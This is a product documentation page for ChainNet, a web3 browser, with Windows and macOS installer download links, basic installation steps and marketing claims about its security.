---
sidebar_position: 1
---

# How to Download ChainNet

Welcome to ChainNet, the browser that's revolutionizing web3. Follow the steps below to get started and enjoy a secure, decentralized browsing experience.

## Safety First

> **ℹ️ Safety First:**  
> At ChainNet, your security is our top priority. When you download and use ChainNet, you can be confident that you're engaging with a platform built with the highest standards of security. Our application undergoes rigorous testing to ensure that it is free from vulnerabilities and safe to use.
>
> We employ advanced encryption protocols to protect your data and transactions, so you can browse, interact, and host content on-chain without worry. Trust in ChainNet for a secure, private, and decentralized web experience. Download with confidence, knowing that your safety is our commitment.

## Download ChainNet

Click the button below to download ChainNet for Windows:

[![Download ChainNet](https://img.shields.io/badge/Download-ChainNet-blue?style=for-the-badge&logo=windows)](https://chainnet.nyc3.cdn.digitaloceanspaces.com/ChainNetExplorer%202.5.1.exe)

Click the button below to download ChainNet for macOS:

[![Download ChainNet](https://img.shields.io/badge/Download-ChainNet-blue?style=for-the-badge&logo=windows)](https://chainnet.nyc3.cdn.digitaloceanspaces.com/ChainNetExplorer-2.0.0-arm64.dmg.zip)

> **ℹ️ Coming Soon:**  
> ChainNet will soon be available mobile devices. Stay tuned!

## Installation Instructions

1. **Download the Installer:** Click the button above to download the latest version of ChainNet for Windows.
2. **Run the Installer:** Locate the downloaded file and run the installer.
3. **Follow the Setup Wizard:** The setup wizard will guide you through the installation process.
4. **Launch ChainNet:** After installation, launch ChainNet from your desktop or start menu.

## Explore ChainNet

- **Learn how to use `web://` protocol:** Access smart contracts directly through the browser's address bar.
- **Deploy your on-chain content:** Follow our [tutorial](./docs/deploy-on-chain) to host your website on-chain.
- **Interact with decentralized applications:** Discover the power of decentralized apps (dApps) within ChainNet.

## Need Help?

If you encounter any issues or have questions, check out our [FAQ](./docs/faq) or reach out to our support team.

> **📢 Note:** By using ChainNet, you're supporting the future of decentralized web technology. We're constantly improving, so expect regular updates with new features and enhancements.

---

With these steps, you'll be up and running with ChainNet in no time. Enjoy the future of web3 browsing today!
